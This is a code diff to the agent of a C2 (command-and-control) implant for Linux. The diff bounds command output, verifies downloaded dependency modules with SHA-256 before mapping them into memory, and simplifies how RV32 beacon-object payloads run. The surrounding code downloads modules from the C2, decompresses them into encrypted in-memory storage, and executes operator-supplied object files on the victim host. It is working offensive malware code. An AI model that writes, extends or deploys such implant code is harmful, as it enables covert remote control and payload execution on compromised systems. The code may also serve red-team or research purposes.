@@ -75,9 +75,9 @@
 
 /* Weak defaults overridden by the generated config_embedded.c. An agent
  * built without a config links but cannot decrypt and exits at startup. */
-__attribute__((weak)) const uint8_t c2_embedded_config[] = {0};
+__attribute__((weak)) const uint8_t c2_embedded_config[] = { 0 };
 __attribute__((weak)) const size_t c2_embedded_config_len = 0;
-__attribute__((weak)) const uint8_t c2_magic_string[] = {0};
+__attribute__((weak)) const uint8_t c2_magic_string[] = { 0 };
 __attribute__((weak)) const size_t c2_magic_string_len = 0;
 __attribute__((weak)) const char c2_build_version[] = "N/A";
 
@@ -104,6 +104,12 @@ static void wipe_rodata(const void *ptr, size_t len) {
 /* Output buffer + builtin commands */
 /* ------------------------------------------------------------------------- */
 
+/* Command output is relayed in one tunnel frame. Keep it below the C2's
+ * 8 MiB result cache and the 10 MiB frame cap; a larger builtin result must
+ * not grow the agent heap without limit. */
+#define AGENT_OUTPUT_MAX (8u << 20)
+#define AGENT_OUTPUT_ALLOC (AGENT_OUTPUT_MAX + 1u)
+
 typedef struct {
   char *p;
   size_t len;
@@ -111,10 +117,22 @@ typedef struct {
 } obuf;
 
 static void obuf_append(obuf *b, const char *s, size_t n) {
-  if (b->len + n + 1 > b->cap) {
-    size_t cap = b->cap ? b->cap * 2 : 256;
-    while (cap < b->len + n + 1)
+  if (b == NULL || s == NULL || n == 0 || b->len >= AGENT_OUTPUT_MAX)
+    return;
+  if (n > AGENT_OUTPUT_MAX - b->len)
+    n = AGENT_OUTPUT_MAX - b->len;
+  size_t need = b->len + n + 1;
+  if (need > b->cap) {
+    size_t cap = b->cap ? b->cap : 256;
+    while (cap < need) {
+      if (cap > AGENT_OUTPUT_ALLOC / 2) {
+        cap = AGENT_OUTPUT_ALLOC;
+        break;
+      }
       cap *= 2;
+    }
+    if (cap < need)
+      return;
     char *np = (char *)realloc(b->p, cap);
     if (np == NULL)
       return;
@@ -143,7 +161,7 @@ static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
   /* No in-place masker: a supervising parent reclaims the process instead. */
   if (cfg->is_run_by_stager && c2_agent_identity_supervisor_present())
     exit(0);
-  struct timespec ts = {(time_t)secs, 0};
+  struct timespec ts = {(time_t)secs, 0 };
   nanosleep(&ts, NULL);
 }
 
@@ -204,7 +222,12 @@ enum {
   DENT_OWNER = 5,
   DENT_PERM = 6,
 };
-enum { FSTAT_NAME = 1, FSTAT_PERM = 2, FSTAT_CHECKSUM = 3, FSTAT_SIZE = 4 };
+enum {
+  FSTAT_NAME = 1,
+  FSTAT_PERM = 2,
+  FSTAT_CHECKSUM = 3,
+  FSTAT_SIZE = 4
+};
 
 static void mode_string(mode_t m, char out[11]) {
   char type = '-';
@@ -221,9 +244,9 @@ static void mode_string(mode_t m, char out[11]) {
   else if (S_ISSOCK(m))
     type = 'S';
   out[0] = type;
-  static const mode_t bits[9] = {0400, 0200, 0100, 0040, 0020,
-                                 0010, 0004, 0002, 0001};
-  static const char rwx[9] = {'r', 'w', 'x', 'r', 'w', 'x', 'r', 'w', 'x'};
+  static const mode_t bits[9] = { 0400, 0200, 0100, 0040, 0020,
+                                  0010, 0004, 0002, 0001 };
+  static const char rwx[9] = { 'r', 'w', 'x', 'r', 'w', 'x', 'r', 'w', 'x' };
   for (int i = 0; i < 9; i++)
     out[1 + i] = (m & bits[i]) ? rwx[i] : '-';
   if (m & S_ISUID)
@@ -480,14 +503,33 @@ static int dependency_key(const char *module, char *key, size_t cap) {
   return (n < 0 || (size_t)n >= cap) ? -1 : n;
 }
 
+/* Compare an image against the C2-provided SHA-256. An empty checksum means the
+ * caller has no identity to verify. */
+static int dependency_matches(c2_agent_session *s, const uint8_t *data,
+                              size_t len, const char *checksum) {
+  if (checksum == NULL || checksum[0] == '\0')
+    return 1;
+  if (s->be->sha256 == NULL)
+    return 0;
+  uint8_t digest[C2_SHA256_BYTES];
+  if (s->be->sha256(s->be->ctx, data, len, digest) != 0)
+    return 0;
+  char hex[C2_SHA256_BYTES * 2 + 1];
+  c2_hex_encode(digest, sizeof(digest), hex);
+  hex[C2_SHA256_BYTES * 2] = '\0';
+  return c2_str_eq_ci(hex, checksum);
+}
+
 /*
- * Ensure an in-memory dependency module is resident in memfs, downloading the
- * C2-hosted <module>.<arch>.gz on first use. This is the Linux analogue of the
- * Windows COFFLoader DLL dependency and is shared by every dependency the
- * agent maps itself (the BOF loader and the RV32 interpreter).
+ * Ensure an in-memory dependency module is resident in memfs. A cached image is
+ * reused only when it matches the SHA-256 the C2 supplied for this run; a stale
+ * copy is replaced with one fresh <module>.<arch>.gz download. This is the
+ * Linux analogue of the Windows COFFLoader DLL dependency and is shared by
+ * every dependency the agent maps itself (the BOF loader and the RV32
+ * interpreter).
  */
 static c2_status ensure_dependency(c2_agent_session *s, c2_memfile *mem,
-                                   const char *module) {
+                                   const char *module, const char *checksum) {
   char key[128];
   int key_len = dependency_key(module, key, sizeof(key));
   if (key_len < 0)
@@ -497,8 +539,10 @@ static c2_status ensure_dependency(c2_agent_session *s, c2_memfile *mem,
   size_t probe_len = 0;
   if (c2_memfile_read_alloc(mem, c2_str_of(key, (size_t)key_len), &probe,
                             &probe_len) == C2_OK) {
+    int match = dependency_matches(s, probe, probe_len, checksum);
     free(probe);
-    return C2_OK;
+    if (match)
+      return C2_OK;
   }
 
   char name[96];
@@ -526,6 +570,8 @@ static c2_status ensure_dependency(c2_agent_session *s, c2_memfile *mem,
   size_t so_len = 0;
   st = c2_gzip_decompress(gz, gz_len, so, so_cap, &so_len);
   free(gz);
+  if (st == C2_OK && !dependency_matches(s, so, so_len, checksum))
+    st = C2_ERR_CRYPTO;
   if (st == C2_OK)
     st = c2_memfile_write(mem, c2_str_of(key, (size_t)key_len), so, so_len);
   free(so);
@@ -549,8 +595,8 @@ static c2_status load_dependency(c2_memfile *mem, const char *module,
 static void execute_bof(c2_agent_session *s, c2_memfile *mem,
                         const uint8_t *bof, size_t bof_len,
                         const char *export_name, const c2_str *tokens,
-                        size_t tokenc, obuf *out) {
-  if (ensure_dependency(s, mem, "coffloader_linux") != C2_OK) {
+                        size_t tokenc, const char *dep_checksum, obuf *out) {
+  if (ensure_dependency(s, mem, "coffloader_linux", dep_checksum) != C2_OK) {
     obuf_append(out, "bof: coffloader_linux unavailable\n", 34);
     return;
   }
@@ -630,78 +676,20 @@ static void run_bof(c2_agent_session *s, c2_memfile *mem,
     return;
   }
   execute_bof(s, mem, bof, bof_len, export_name, &cmd->items[arg_start],
-              cmd->count - arg_start, out);
+              cmd->count - arg_start, NULL, out);
   free(bof);
 }
 
 #endif /* C2_AGENT_ENABLE_BOF */
 
 #if C2_AGENT_ENABLE_RVVM
-/* Fetch a module companion into memfs and return its plaintext bytes. The
- * file is verified, decompressed and stored in encrypted memfs. */
-static c2_status fetch_companion(c2_agent_session *s, c2_memfile *mem,
-                                 const c2_module_file *f, uint8_t **out,
-                                 size_t *out_len) {
-  size_t gz_cap = 32u * 1024u * 1024u;
-  uint8_t *gz = (uint8_t *)malloc(gz_cap);
-  if (gz == NULL)
-    return C2_ERR_NOMEM;
-  size_t gz_len = 0;
-  c2_status st = c2_session_download(s, c2_str_of(f->name, strlen(f->name)), gz,
-                                     gz_cap, &gz_len);
-  if (st != C2_OK) {
-    free(gz);
-    return st;
-  }
-  if (f->checksum[0] != '\0') {
-    uint8_t digest[C2_SHA256_BYTES];
-    if (s->be->sha256 == NULL ||
-        s->be->sha256(s->be->ctx, gz, gz_len, digest) != 0) {
-      free(gz);
-      return C2_ERR_IO;
-    }
-    char hex[C2_SHA256_BYTES * 2 + 1];
-    c2_hex_encode(digest, sizeof(digest), hex);
-    hex[C2_SHA256_BYTES * 2] = '\0';
-    if (!c2_str_eq_ci(hex, f->checksum)) {
-      free(gz);
-      return C2_ERR_PROTO;
-    }
-  }
-  uint8_t *lib = (uint8_t *)malloc(gz_cap);
-  if (lib == NULL) {
-    free(gz);
-    return C2_ERR_NOMEM;
-  }
-  size_t lib_len = 0;
-  st = c2_gzip_decompress(gz, gz_len, lib, gz_cap, &lib_len);
-  free(gz);
-  if (st != C2_OK) {
-    free(lib);
-    return st;
-  }
-  char key[512];
-  size_t kl = c2_memfile_key(f->name, strlen(f->name), key, sizeof(key));
-  if (kl == 0) {
-    free(lib);
-    return C2_ERR_NOMEM;
-  }
-  st = c2_memfile_write(mem, c2_str_of(key, kl), lib, lib_len);
-  free(lib);
-  if (st != C2_OK)
-    return st;
-  return c2_memfile_read_alloc(mem, c2_str_of(key, kl), out, out_len);
-}
-
-/* Run one RV32 BOF object already in memory through the rvvm_linux
- * dependency. `entry` is the export ("" means "go") and `bof_args` is the
- * packed COFF argument buffer. */
+/* Run one RV32 guest executable already in memory through the rvvm_linux
+ * dependency. `bof_args` is the packed COFF argument buffer. */
 static void execute_rv(c2_agent_session *s, c2_memfile *mem,
                        const uint8_t *image, size_t image_len,
-                       const char *entry, const uint8_t *bof_args,
-                       size_t bof_len, const c2_rv_lib *libs, size_t nlibs,
-                       obuf *out) {
-  if (ensure_dependency(s, mem, "rvvm_linux") != C2_OK) {
+                       const uint8_t *bof_args, size_t bof_len,
+                       const char *dep_checksum, obuf *out) {
+  if (ensure_dependency(s, mem, "rvvm_linux", dep_checksum) != C2_OK) {
     obuf_append(out, "rv: rvvm_linux unavailable\n", 27);
     return;
   }
@@ -713,8 +701,8 @@ static void execute_rv(c2_agent_session *s, c2_memfile *mem,
   }
 
   char *result = NULL;
-  c2_status st = c2_rv_run(loader, loader_len, image, image_len, entry,
-                           bof_args, bof_len, libs, nlibs, &result);
+  c2_status st = c2_rv_run(loader, loader_len, image, image_len, bof_args,
+                           bof_len, &result);
   if (st == C2_OK && result != NULL) {
     obuf_append(out, result, strlen(result));
     free(result);
@@ -741,10 +729,12 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
   char type[32] = "";
   char file[512] = "";
   char checksum[128] = "";
+  char dep_checksum[128] = "";
   c2_cmd_pick_flag(cmd, "--mod_name", mod_name, sizeof(mod_name));
   c2_cmd_pick_flag(cmd, "--type", type, sizeof(type));
   c2_cmd_pick_flag(cmd, "--file_to_download", file, sizeof(file));
   c2_cmd_pick_flag(cmd, "--checksum", checksum, sizeof(checksum));
+  c2_cmd_pick_flag(cmd, "--dep_checksum", dep_checksum, sizeof(dep_checksum));
 
   size_t inv_cap = 256u * 1024u;
   char *invocation = (char *)malloc(inv_cap);
@@ -841,8 +831,8 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
 
 #if C2_AGENT_ENABLE_RVVM
   if (c2_str_eq_ci(type, "rv")) {
-    /* An rv payload is a portable BOF: an RV32 relocatable object that the
-     * interpreter relocates against its embedded runtime. */
+    /* An rv payload is a static RV32 musl executable; the guest entry shim
+     * calls the BOF. */
     char export_name[64] = "";
     c2_str tokens[64];
     size_t tokenc = 0;
@@ -851,14 +841,9 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
                                   sizeof(export_name), tokens, &tokenc,
                                   sizeof(tokens) / sizeof(tokens[0]), tokbuf,
                                   tokbuf_cap, &tokbuf_used);
-    c2_module_file mfiles[C2_MODULE_FILE_MAX];
-    size_t nmfiles = 0;
-    if (st == C2_OK)
-      st = c2_module_files_parse(invocation, strlen(invocation), mfiles,
-                                 &nmfiles);
     free(invocation);
-    if (st != C2_OK || export_name[0] == '\0') {
-      obuf_append(out, "custom_module: rv module has no coff_export\n", 45);
+    if (st != C2_OK) {
+      obuf_append(out, "custom_module: bad invocation\n", 29);
       free(tokbuf);
       free(obj);
       return;
@@ -884,35 +869,8 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
       free(obj);
       return;
     }
-    /* Companion files are RISC-V libraries delivered with the module. They
-     * are fetched into encrypted memfs and passed as in-memory images. */
-    c2_rv_lib libs[C2_MODULE_FILE_MAX];
-    uint8_t *libbufs[C2_MODULE_FILE_MAX] = {0};
-    size_t nlibs = 0;
-    for (size_t i = 0; i < nmfiles; i++) {
-      uint8_t *lb = NULL;
-      size_t ll = 0;
-      st = fetch_companion(s, mem, &mfiles[i], &lb, &ll);
-      if (st != C2_OK) {
-        obuf_append(out, "custom_module: library fetch failed\n", 37);
-        for (size_t k = 0; k < nlibs; k++)
-          free(libbufs[k]);
-        free(packed);
-        free(tokbuf);
-        free(obj);
-        return;
-      }
-      libbufs[nlibs] = lb;
-      libs[nlibs].buf = lb;
-      libs[nlibs].len = ll;
-      nlibs++;
-    }
-    TRACE("[agent] custom_module %s: rv BOF %zu args export=%s libs=%zu\n",
-          mod_name, tokenc, export_name, nlibs);
-    execute_rv(s, mem, obj, obj_len, export_name, packed, packed_len, libs,
-               nlibs, out);
-    for (size_t i = 0; i < nlibs; i++)
-      free(libbufs[i]);
+    TRACE("[agent] custom_module %s: rv BOF %zu args\n", mod_name, tokenc);
+    execute_rv(s, mem, obj, obj_len, packed, packed_len, dep_checksum, out);
     free(packed);
     free(tokbuf);
     free(obj);
@@ -939,7 +897,8 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     }
     TRACE("[agent] custom_module %s: %zu args export=%s\n", mod_name, tokenc,
           export_name);
-    execute_bof(s, mem, obj, obj_len, export_name, tokens, tokenc, out);
+    execute_bof(s, mem, obj, obj_len, export_name, tokens, tokenc, dep_checksum,
+                out);
     free(tokbuf);
     free(obj);
     return;
@@ -1192,7 +1151,7 @@ __attribute__((visibility("default"))) int main(void) {
         continue;
       TRACE("[agent] job received\n");
 
-      obuf out = {0};
+      obuf out = { 0 };
       dispatch(&m, &s, &mem, &out);
       (void)c2_session_send_result(&s, &msg, m.job_id, &m.cmd_slice,
                                    (const uint8_t *)out.p, out.len);
